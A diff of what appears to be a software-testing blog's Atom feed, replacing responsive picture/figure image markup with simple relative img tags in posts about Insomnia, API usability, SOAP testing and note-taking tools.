@@ -2663,16 +2834,7 @@ To preview a specific definition, you need to pass a definition label from confi
 <li><a href="https://www.onenote.com/" class="external-link">OneNote</a>: I heard it&rsquo;s fine if you are Windows user. Well, I am not :)</li>
 <li><a href="https://keep.google.com/" class="external-link">Google Keep</a>: perfect inbox for quick notes, shopping, and other lists that I need to access from the phone:</li>
 </ul>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2020/07/03/knowledge-management-tools/km_keep_hu_b8645d07b302c7ed.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2020/07/03/knowledge-management-tools/km_keep.png" alt="Google Keep with transient lists" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="km_keep.png" alt="Google Keep with transient lists"></p>
 <h3 id="zettels" >
   <a href="#zettels">Zettels</a>
 </h3>
@@ -2765,16 +2927,7 @@ To preview a specific definition, you need to pass a definition label from confi
 <p>Thus, I made some decision:</p>
 <p><strong>1.</strong> I left RST and MoT (and <a href="https://www.ministryoftesting.com/news/ministry-of-testing-slacks-when-two-become-one" class="external-link">its abolished sister group</a>) slack communities. Stayed only in the ABT, because it&rsquo;s smaller and more enjoyable.</p>
 <p><strong>2.</strong> Won&rsquo;t hunt for any more testers-centric resources. Mind you, testers-centric ≠ testing-centric. Whatever I had in RSS + ABT podcast is more than enough.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2020/07/01/hmms-june/rss_feeds_hu_a99b6a2c1031af7.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2020/07/01/hmms-june/rss_feeds.png" alt="45 RSS feeds in &ldquo;Testing&rdquo; category" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="rss_feeds.png" alt="45 RSS feeds in &ldquo;Testing&rdquo; category"></p>
 <p><strong>3.</strong> Won&rsquo;t save articles into reading queue &ldquo;just in case&rdquo;, if it&rsquo;s obvious from the title and the first paragraph that the author is repeating themselves.</p>
 <p><strong>4.</strong> Change &ldquo;About me&rdquo; page to be less role specific. I wrote it a long time ago.</p>
 <p><strong>5.</strong> Do I contribute to the same noise? Perhaps. Can&rsquo;t promise, but I&rsquo;ll try not to. Obviously, these <em>Hmms</em> aren&rsquo;t really original content, but <a href="https://eugeneyan.com/writing/reading-note-taking-writing/" class="external-link">written reflection is a great way to process information</a>, sorry!</p>
@@ -2991,16 +3144,7 @@ Insomnia is easy to use on Linux, has plugins, and UI is clean and simple.</p>
 while others contain everything related to the particular client use case or event (i.e., cross-service).</p>
 <p>Our first examples: get current weather and forecast for Montreal. OpenWeatherMap API requires an API key,
 so you need to add it to the query parameters for each request.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2020/04/22/using-insomnia-for-api-exploration/insomnia_1_hu_d488b90d1560a01a.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2020/04/22/using-insomnia-for-api-exploration/insomnia_1.png" alt="Insomnia: basic interface" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="insomnia_1.png" alt="Insomnia: basic interface"></p>
 <h2 id="environments" >
   <a href="#environments">Environments</a>
 </h2>
@@ -3013,74 +3157,20 @@ so you need to add it to the query parameters for each request.</p>
 </ul>
 <p>Ok, so for this API let&rsquo;s do like this. <code>https://api.openweathermap.org/data/2.5</code> can go into base,
 because we have access only to one server.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2020/04/22/using-insomnia-for-api-exploration/insomnia_2_hu_be2a89ecaff1d6d7.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2020/04/22/using-insomnia-for-api-exploration/insomnia_2.png" alt="Insomnia: base environment" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="insomnia_2.png" alt="Insomnia: base environment"></p>
 <p>An API key is perfect for the sub environment.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2020/04/22/using-insomnia-for-api-exploration/insomnia_3_hu_9aa2c78def955108.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2020/04/22/using-insomnia-for-api-exploration/insomnia_3.png" alt="Insomnia: sub environment" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="insomnia_3.png" alt="Insomnia: sub environment"></p>
 <p><em>&ldquo;Montreal&rdquo;</em> is stored as a folder-level value, just for the sake of example.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2020/04/22/using-insomnia-for-api-exploration/insomnia_4_hu_d53fd851ff9a216b.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2020/04/22/using-insomnia-for-api-exploration/insomnia_4.png" alt="Insomnia: folder-level environment" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="insomnia_4.png" alt="Insomnia: folder-level environment"></p>
 <p>Then, our requests will look like (use <code>{{var_name}}</code> to access variable):</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2020/04/22/using-insomnia-for-api-exploration/insomnia_5_hu_4856ba5779b1bf35.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2020/04/22/using-insomnia-for-api-exploration/insomnia_5.png" alt="Insomnia: requests with variables from environments" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="insomnia_5.png" alt="Insomnia: requests with variables from environments"></p>
 <p>You might notice that we still have to fill out the API key query parameter for each request. Kinda boring.
 That&rsquo;s where plugins can help, in this case, it&rsquo;s <code>insomnia-plugin-defaults</code>.
 Just go into <em>Preferences &gt; Plugins</em> and type its name to install.
 This plugin allows us to set default headers and/or query parameters in the environments.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2020/04/22/using-insomnia-for-api-exploration/insomnia_6_hu_156124a7c7cfa256.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2020/04/22/using-insomnia-for-api-exploration/insomnia_6.png" alt="Insomnia: environment setup with query param defaults" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="insomnia_6.png" alt="Insomnia: environment setup with query param defaults"></p>
 <p>And now we can remove it from requests:</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2020/04/22/using-insomnia-for-api-exploration/insomnia_7_hu_70dce02822aa04c4.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2020/04/22/using-insomnia-for-api-exploration/insomnia_7.png" alt="Insomnia: requests with default query params" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="insomnia_7.png" alt="Insomnia: requests with default query params"></p>
 <h2 id="response-querying" >
   <a href="#response-querying">Response querying</a>
 </h2>
@@ -3088,16 +3178,7 @@ This plugin allows us to set default headers and/or query parameters in the envi
 weather descriptions? We can do it by using JSONPath response filtering.</p>
 <p><code>$.list[*].weather[*].description</code> means <em>&lsquo;Get descriptions from each element of <code>weather</code>
 array that is a property of elements in the <code>list</code> array&rsquo;</em>.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2020/04/22/using-insomnia-for-api-exploration/insomnia_8_hu_4e3acf9bf438928d.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2020/04/22/using-insomnia-for-api-exploration/insomnia_8.png" alt="Insomnia: querying response using JSONPath" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="insomnia_8.png" alt="Insomnia: querying response using JSONPath"></p>
 <h2 id="generating-values" >
   <a href="#generating-values">Generating values</a>
 </h2>
@@ -3106,26 +3187,8 @@ array that is a property of elements in the <code>list</code> array&rsquo;</em>.
 cases plugins come to the rescue yet again: <code>insomnia-plugin-random</code> uses <a href="https://chancejs.com/" class="external-link">Chance</a> library
 which gives you tons of options.</p>
 <p>Here is how to generate random latitude and longitude coordinates:</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2020/04/22/using-insomnia-for-api-exploration/insomnia_9_hu_146e69de675cca6a.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2020/04/22/using-insomnia-for-api-exploration/insomnia_9.png" alt="Insomnia: random value generation" defer>
-	</picture>
-	
-</figure></p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2020/04/22/using-insomnia-for-api-exploration/insomnia_10_hu_860f80608e3f96a.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2020/04/22/using-insomnia-for-api-exploration/insomnia_10.png" alt="Insomnia: usage of generated values in the request" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="insomnia_9.png" alt="Insomnia: random value generation"></p>
+<p><img src="insomnia_10.png" alt="Insomnia: usage of generated values in the request"></p>
 <p>BTW, use <span class="kbd"><kbd>Ctrl</kbd><span>+</span><kbd>Space</kbd></span>
  shortcut for the fastest template tag autocomplete.</p>
 <h2 id="reusing-response-values" >
@@ -3133,26 +3196,8 @@ which gives you tons of options.</p>
 </h2>
 <p>Another commonly used feature is sending a request with values from the response of another request.
 In Insomnia you should use <code>Response</code> template tag and JSONPath if you want to grab a value from the response body:</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2020/04/22/using-insomnia-for-api-exploration/insomnia_11_hu_6467d274a70787cb.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2020/04/22/using-insomnia-for-api-exploration/insomnia_11.png" alt="Insomnia: pulling values from previous response" defer>
-	</picture>
-	
-</figure></p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2020/04/22/using-insomnia-for-api-exploration/insomnia_12_hu_a084006d768ad54c.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2020/04/22/using-insomnia-for-api-exploration/insomnia_12.png" alt="Insomnia: request with pulled values" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="insomnia_11.png" alt="Insomnia: pulling values from previous response"></p>
+<p><img src="insomnia_12.png" alt="Insomnia: request with pulled values"></p>
 <p>Pretty simple, huh?</p>
 <p>There are other useful features and no one stops you from writing a plugin if you miss anything. But, s&rsquo;il te plaît,
 don&rsquo;t try to turn it into a complex automation solution. That&rsquo;s what programming languages are for.</p>
@@ -3169,16 +3214,7 @@ don&rsquo;t try to turn it into a complex automation solution. That&rsquo;s what
 <h2 id="top-x-videos-and-readings" >
   <a href="#top-x-videos-and-readings">Top X videos and readings</a>
 </h2>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2020/03/31/hmms-march/apis_meme_hu_6a201d55f49f102b.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2020/03/31/hmms-march/apis_meme.jpg" alt="Meme: APIs, APIs everywhere" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="apis_meme.jpg" alt="Meme: APIs, APIs everywhere"></p>
 <ul>
 <li>Erik Wilde started a video series about API design,
 and <a href="https://www.youtube.com/watch?v=qc_DF01qgZg" class="external-link">the last one</a> covers pros and cons of exposing system APIs.</li>
@@ -3193,16 +3229,7 @@ I haven’t heard from them since as they still haven’t shipped their product 
 <h2 id="top-x-videos-and-readings" >
   <a href="#top-x-videos-and-readings">Top X videos and readings</a>
 </h2>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2020/03/31/hmms-march/apis_meme_hu_6a201d55f49f102b.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2020/03/31/hmms-march/apis_meme.jpg" alt="Meme: APIs, APIs everywhere" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="apis_meme.jpg" alt="Meme: APIs, APIs everywhere"></p>
 <ul>
 <li>Erik Wilde started a video series about API design,
 and <a href="https://www.youtube.com/watch?v=qc_DF01qgZg" class="external-link">the last one</a> covers pros and cons of exposing system APIs.</li>
@@ -3633,16 +3660,7 @@ Even though I never played Skyrim or Morrowind, TES wiki is an awesome read for 
 <p><a href="https://github.com/zalando/zally" class="external-link">Zally</a> is a linter from Zalando, which is famous for its open-sourced <a href="https://opensource.zalando.com/restful-api-guidelines/" class="external-link">API guidelines</a>.</p>
 <p>It ticks all our requirements except for the ease of setup: Zally is written in Kotlin. I was too lazy even to try running it. I&rsquo;m sure it&rsquo;s an excellent tool, but not for us.</p>
 <p>BTW, it has nice UI:</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2019/12/26/lunchlearn-linting-openapi-description-docs/zally_hu_a0d9b5d0165b8cf6.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2019/12/26/lunchlearn-linting-openapi-description-docs/zally.png" alt="Zally web UI with violations highlighting and links" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="zally.png" alt="Zally web UI with violations highlighting and links"></p>
 <h2 id="speccy" >
   <a href="#speccy">Speccy</a>
 </h2>
@@ -3853,27 +3871,9 @@ probably never consider how it affects existing canon.</p>
 </ul>
 <p>But there are some disappointments. Let&rsquo;s start with the objective one: keyboard.</p>
 <p>This is my old keyboard: it has Numpad, all keys, and even separate volume controls.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2019/12/07/weekly-hmms-communities-laptops-linux/lenovo_keyboard_hu_23e350250a8ae445.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2019/12/07/weekly-hmms-communities-laptops-linux/lenovo_keyboard.jpg" alt="Lenovo G560 keyboard" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="lenovo_keyboard.jpg" alt="Lenovo G560 keyboard"></p>
 <p>This is the new one:</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2019/12/07/weekly-hmms-communities-laptops-linux/dell_keyboard_hu_7dfe503e98e253e2.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2019/12/07/weekly-hmms-communities-laptops-linux/dell_keyboard.jpg" alt="Dell XPS15 keyboard" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="dell_keyboard.jpg" alt="Dell XPS15 keyboard"></p>
 <p>I begrudgingly accepted not to have a Numpad and volume control keys, yet I didn&rsquo;t even consider that there wouldn&rsquo;t be separate Home, End, PgUp, and PgDn! Also, no right Fn key. Wow. What bewilders me more is that a previous model did have separate keys: but <a href="https://www.dell.com/community/XPS/Control-Home-Control-End-Keys/td-p/6212592" class="external-link">people complained about it on the Dell forum</a>. You, guys, I hate you. You&rsquo;re exactly like <a href="https://xkcd.com/1172/" class="external-link">from that XKCD comic strip</a>.</p>
 <p>Next disappointment is a display. Beware, this will be unexpected&hellip; I don&rsquo;t like HiDPI. I&rsquo;m so accustomed to shitty displays, that better ones feel wrong and uncomfortable. Colors and images are fine, but text, yikes. Letters are not crisp enough, there is something smudgy about them.</p>
 <p>I can already hear that it&rsquo;s because I&rsquo;m on Linux. NOPE. This laptop came with Windows 10 (I left it in a dual boot), but the text is blurry too. Even more, I think Linux actually does better jobs with antialiasing, because old Windows apps look particularly horrible.</p>
@@ -4257,16 +4257,7 @@ probably never consider how it affects existing canon.</p>
 </h2>
 <p>The distinction between analytical and empirical methods is that the latter investigates how real users will use the product.</p>
 <p>But don&rsquo;t assume that empirical methods are by default better than analytical: both are important because they discover different problems. <a href="https://link.springer.com/content/pdf/10.1007%2F978-3-642-34347-6_10.pdf" class="external-link">This research</a> showed that heuristics were more efficient in finding documentation and structural problems, whereas empirical methods were more useful in finding UX and runtime specific issues.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2019/10/19/how-to-test-api-usability-part-2/api_ux_barchart_hu_d93a77afd3a5923d.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2019/10/19/how-to-test-api-usability-part-2/api_ux_barchart.png" alt="Barchart with comparison of different issue types found via different methods" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="api_ux_barchart.png" alt="Barchart with comparison of different issue types found via different methods"></p>
 <h3 id="monitoring" >
   <a href="#monitoring">Monitoring</a>
 </h3>
@@ -4315,32 +4306,14 @@ probably never consider how it affects existing canon.</p>
 </ul>
 <div class="callout warning"><p>Now, I want to point out that the aforementioned language discrimination is not my invention. If you&rsquo;re lucky, perhaps you&rsquo;ll find the original article by Visual Studio usability expert, where these quirky definitions were introduced. Unfortunately, I was able to get only [its first page in the Wayback Machine][visual-studio], so you have to take my word for it. Nevertheless, I hope this example can encourage you to create your own personas.</p></div>
 <p>We can also combine personas with cognitive dimensions. Create <a href="https://en.wikipedia.org/wiki/Radar_chart" class="external-link">a radar chart</a> with 12 axes, where each axis is a cognitive dimension. Next, plot current values for your API and values according to the persona&rsquo;s expectations. This chart is great for comparing how existing API corresponds to user values.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2019/10/19/how-to-test-api-usability-part-2/api_ux_chart_hu_e51a108765ca9be0.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2019/10/19/how-to-test-api-usability-part-2/api_ux_chart.png" alt="Radar chart with comparison of developer expectations vs current state of API" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="api_ux_chart.png" alt="Radar chart with comparison of developer expectations vs current state of API"></p>
 <p>Developer from the example chart (blue line) prefers API with a high level of consistency (10) and hates writing boilerplate (4). As we can see, the current state of API (black line) doesn&rsquo;t satisfy these criteria.</p>
 <h2 id="summing-up" >
   <a href="#summing-up">Summing up</a>
 </h2>
 <p>Readers comfortable with GUI usability testing would say: &ldquo;That&rsquo;s exactly the same stuff!&rdquo;. And you&rsquo;re right, there is nothing supernatural about API usability. Even though it&rsquo;s called an <em>application programming</em> interface, programs are yet to learn how to find other APIs and use them automatically; they still need us, meatbags. That&rsquo;s why almost everything applied for GUI usability evaluation is reusable for API with some adjustments.</p>
 <p>Now, what about <em>the best method?</em>  None, apply them all! <a href="https://link.springer.com/content/pdf/10.1007%2F978-3-642-34347-6_10.pdf" class="external-link">According to this research</a>, each method can identify unique issues.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2019/10/19/how-to-test-api-usability-part-2/api_ux_stats_hu_266cb1bea6bc0cdb.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2019/10/19/how-to-test-api-usability-part-2/api_ux_stats.png" alt="Venn diagram showing how different methods overlap in finding different issues" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="api_ux_stats.png" alt="Venn diagram showing how different methods overlap in finding different issues"></p>
 <p>If you are tight on resources, I suggest using the least expensive methods: heuristics, cognitive dimensions, walkthrough, and support tickets. Even the simplest techniques can drive API improvements.</p>
 <p>Someone would argue that API usability is not that important: &ldquo;we don&rsquo;t have time for that, it&rsquo;s a dev thingy.&rdquo; But developers created <a href="https://github.com/google/styleguide" class="external-link">style guides</a> not just to be fancy; this serves to accelerate the achievement of shippable quality. We care about hidden code quality, therefore we need to care about externally visible code like APIs even more.</p>
 ]]></content>
@@ -4415,16 +4388,7 @@ There was a time when every new tester came to me during the onboarding and aske
   <a href="#cognitive-walkthrough">Cognitive walkthrough</a>
 </h3>
 <p>While the first two methods are based on checking API against some kind of list of criteria, cognitive walkthrough is closer to scenario-based testing. Essentially, an expert comes up with typical API usage scenarios and attempts to perform them.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2019/10/13/how-to-test-api-usability-part-1/walkthrough_hu_b6307984cb5f96a7.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2019/10/13/how-to-test-api-usability-part-1/walkthrough.png" alt="Cognitive walkthrough example" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="walkthrough.png" alt="Cognitive walkthrough example"></p>
 <p>You can combine this method with heuristics. When we analyzed services, we found out that there were  problems with the consistency: when you sent a request to create an entity, some services responded with entity version id, while others provided root id. Moreover, most of the services required entity id for creation of other entities, and again, it could be either root or version id. It didn&rsquo;t look that bad, until we tried walking through a business scenario:</p>
 <ol>
 <li>Create an entitling document</li>
@@ -4667,16 +4631,7 @@ There was a time when every new tester came to me during the onboarding and aske
 <p>As I said before, you need to start testing with documentation. For that you can use special editors. Two most common are <a href="https://www.oxygenxml.com/" class="external-link">Oxygen</a> (cross-platform) and <a href="https://www.altova.com/" class="external-link">Altova</a> (Windows-only); both are not free. These are feature-heavy applications used by analysts.</p>
 <p>I routinely use three features: XSD visualization, XML generation, and XML validation.</p>
 <p><strong>XSD visualization</strong> is helpful to easily spot schema elements, attributes, and restrictions. For example, <code>CheckTextRequest</code> has a required <code>text</code> element, whereas all three attributes are optional. In addition, attribute <code>option</code> has a default value <code>0</code>.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2019/09/15/soap-testing-101/oxygen_hu_5955796806578d58.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2019/09/15/soap-testing-101/oxygen.png" alt="XSD visualization in Oxygen" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="oxygen.png" alt="XSD visualization in Oxygen"></p>
 <p>Visualization is handy when there are lots of types and restrictions. If you need only this feature and you don&rsquo;t want to buy apps, you can check
 <a href="http://stackoverflow.com/questions/2486758/how-to-visualize-an-xml-schema" class="external-link">free alternatives</a> like JDeveloper.</p>
 <p>You can use <strong>XML generation</strong> to quickly create examples of messages based on supplied XSD. I use is for exploration and experimentation on possible XMLs and checking how restrictions are applied.</p>
@@ -4878,16 +4833,7 @@ There was a time when every new tester came to me during the onboarding and aske
 <p>Service is reliable if it works when it&rsquo;s expected to be working and provides timely feedback in case of any problems.</p>
 <p>Worst performance problems I encountered were with export services. One of them was working perfectly fine until the biggest organization in the system started using it and crashing application servers. Hot-fixes after hot-fixes, optimizations, new version; nothing helped. And we couldn&rsquo;t disable that service or completely rewrite its public API because of contractual obligations.</p>
 <p>So, what if your service experiences problems? How external users will learn about it? Will there be any alert about temporary issues or downtimes? Any resolution time frames? Usually, there is a special web page with answers to these question, with a table like this:</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2019/09/02/your-api-is-your-public-image/api_status_hu_c6ce3654a14f5b54.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2019/09/02/your-api-is-your-public-image/api_status.png" alt="API status table" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="api_status.png" alt="API status table"></p>
 <p>And beware, this page should not on the same infrastructure as the services it&rsquo;s showing! It would be quite embarrassing if <a href="https://twitter.com/awscloud/status/836656664635846656" class="external-link">it goes down at the same time your services go down</a>.</p>
 <h3 id="crappy-usability" >
   <a href="#crappy-usability">Crappy usability</a>
@@ -4907,16 +4853,7 @@ There was a time when every new tester came to me during the onboarding and aske
 <ul>
 <li>Service works fine, but error messages are not that informative? Users won&rsquo;t understand how to fix an error (and probably will open a support ticket, so you&rsquo;ll needlessly spend time resolving non-existing issue).</li>
 </ul>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2019/09/02/your-api-is-your-public-image/bad_error_message_hu_f199ea986f899f94.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2019/09/02/your-api-is-your-public-image/bad_error_message.png" alt="Unhelpful error message" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="bad_error_message.png" alt="Unhelpful error message"></p>
 <ul>
 <li>You have UI and API? Don&rsquo;t forget to check they correspond to each other. The most common problem is when constraints on UI fields don&rsquo;t match same fields in API: for example, UI can accept maximum 50 characters for the name and API only 20, which leads to errors when trying to export anything created on UI.</li>
 <li>Don&rsquo;t forget about versionning (in API and its documentation). The older your services are, more careful you should be with incompatible changes. Documentation should always be up-to-date: sounds obvious, but we had a big fuck up when someone accidentally published documentation for upcoming API version and external developers started trying to use these new features, didn&rsquo;t find them, and bombed support team with &ldquo;nothing works again&rdquo; tickets.</li>
@@ -5228,27 +5165,9 @@ There was a time when every new tester came to me during the onboarding and aske
     <author><name>Yuliya Bagriy</name></author><id>tag:www.aviskase.com,2018-03-19:/articles/2018/03/19/mega-mind-map-version-2/</id>
     
     <summary type="html"><![CDATA[<p>My <a href="https://github.com/aviskase/mega-mind-map" class="external-link">not-so-mega mind map</a> has grown a little bit. I finally added exploratory testing tours and ideas on how to make test cases less rigid, all that great stuff from &ldquo;Exploratory Software Testing&rdquo; by James A. Whittaker.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2018/03/19/mega-mind-map-version-2/mmm_v2_hu_64d5395312397fd0.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2018/03/19/mega-mind-map-version-2/mmm_v2.png" alt="Mega mind map version 2" defer>
-	</picture>
-	
-</figure></p>]]></summary>
+<p><img src="mmm_v2.png" alt="Mega mind map version 2"></p>]]></summary>
     <content type="html"><![CDATA[<p>My <a href="https://github.com/aviskase/mega-mind-map" class="external-link">not-so-mega mind map</a> has grown a little bit. I finally added exploratory testing tours and ideas on how to make test cases less rigid, all that great stuff from &ldquo;Exploratory Software Testing&rdquo; by James A. Whittaker.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2018/03/19/mega-mind-map-version-2/mmm_v2_hu_64d5395312397fd0.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2018/03/19/mega-mind-map-version-2/mmm_v2.png" alt="Mega mind map version 2" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="mmm_v2.png" alt="Mega mind map version 2"></p>
 ]]></content>
   </entry>
   <entry>
@@ -5268,56 +5187,20 @@ There was a time when every new tester came to me during the onboarding and aske
 <p>Imagine an ideal world of software development. Scope is clear. Everything is done on time in relaxed manner without rush. Everybody is motivated to create the best product. Everybody has happy life outside of work. No stress. Users are eager to help too. And all these aren&rsquo;t just for one product, but true for all software in the world. Great, isn&rsquo;t it?</p>
 <p>Now, when I&rsquo;m thinking about this <em>ideal</em> world, I can&rsquo;t find a place for testers in it. There is just no place for bugs. Developers and analysts have all the time to design and build a product without real bugs. Remember, they don&rsquo;t have just a time, they&rsquo;re also motivated, so they definitively test product. They do it themselves&hellip; so there is no need for a <em>separate</em> role of a tester.</p>
 <p>Let&rsquo;s visualize this tester-less world as a perfect disk:</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2018/01/23/testers-in-this-world/world_1_hu_7782e830fd85324c.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2018/01/23/testers-in-this-world/world_1.png" alt="Ideal world of development" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="world_1.png" alt="Ideal world of development"></p>
 <h2 id="real-world-of-software-development" >
   <a href="#real-world-of-software-development">Real world of software development</a>
 </h2>
 <p>But our current world is not ideal. No one has enough time. Overtimes. Burning out. Problems outside work. Toxic environment. No motivation. Some rogue manager keeps adding features out of scope. And bugs, bugs everywhere. This world is distorted, some products are a bit better than others, but no one is perfect.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2018/01/23/testers-in-this-world/world_2_hu_b940df64b09555da.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2018/01/23/testers-in-this-world/world_2.png" alt="Real world of development" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="world_2.png" alt="Real world of development"></p>
 <h2 id="testers-in-the-real-world-of-software-development" >
   <a href="#testers-in-the-real-world-of-software-development">Testers in the real world of software development</a>
 </h2>
 <p>And that&rsquo;s where testers are coming. We are like clay, like sealing foam. We patch this not-ideal world. We make it less distorted.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2018/01/23/testers-in-this-world/world_3_hu_375cc522fff8ce78.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2018/01/23/testers-in-this-world/world_3.png" alt="Real world of development with testers" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="world_3.png" alt="Real world of development with testers"></p>
 <p>All products are distorted in different ways, that&rsquo;s why you can see testers doing all kind of things. Some are just &ldquo;manual monkeys.&rdquo; On a different extreme are those who automate test cases that are written by others. Most are somewhere in between. There are projects where testers have a hat of analytic. Or support. Or both. Or PM. Someone, maybe gurus, don&rsquo;t test at all: they mentor a team to test themselves, control that quality is efficiently insured by others.</p>
 <p>Here is a fun fact. That patched version is still a lie. Testers are also not perfect. Thus, our world looks more like this:</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2018/01/23/testers-in-this-world/world_4_hu_893cd1a021cb17b5.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2018/01/23/testers-in-this-world/world_4.png" alt="Even more real world of development with testers" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="world_4.png" alt="Even more real world of development with testers"></p>
 <p>We can&rsquo;t patch all holes. But we are here to try.</p>
 ]]></content>
   </entry>
@@ -5340,16 +5223,7 @@ There was a time when every new tester came to me during the onboarding and aske
 <li>APV aka ДПЗ (Actions / Parameters / Values)</li>
 <li>Value analysis</li>
 </ul>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2018/01/06/2018-and-mega-mind-map/mmm_v1_hu_9f7994874c9c6167.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2018/01/06/2018-and-mega-mind-map/mmm_v1.jpg" alt="Mega mind map version 1" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="mmm_v1.jpg" alt="Mega mind map version 1"></p>
 ]]></content>
   </entry>
   <entry>
